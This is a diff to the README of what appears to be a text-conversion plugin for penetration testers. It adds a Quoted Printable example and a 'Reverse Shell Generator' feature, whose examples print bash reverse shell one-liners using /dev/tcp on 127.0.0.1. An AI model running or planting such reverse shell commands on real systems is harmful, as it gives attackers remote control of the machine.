@@ -33,6 +33,7 @@ Convert the region you selected or convert all characters.
 * String => RandomCase
 * String <=> Quoted Printable
 * String Reverse
+* Reverse Shell Generator
 
 
 ## ChangeLog
@@ -263,4 +264,20 @@ eg:
 ```
 phpinfo(); => phPiNfo();
 phpinfo(); => PhpINFo();
+```
+
+* String <=> [Quoted Printable](https://en.wikipedia.org/wiki/Quoted-printable)
+eg:
+
+```
+— Antoine de Saint-Exupéry, Citadelle (1948) <=> =E2=80=94=E2=80=89Antoine=20de=20Saint-Exup=C3=A9ry,=20Citadelle=20(1948)
+```
+
+* IP[:Port] => Reverse Shell Generator
+
+eg:
+
+```
+127.0.0.1 => bash -i >& /dev/tcp/127.0.0.1/1337 0>&1
+127.0.0.1:8888 => bash -i >& /dev/tcp/127.0.0.1/8888 0>&1
 ```
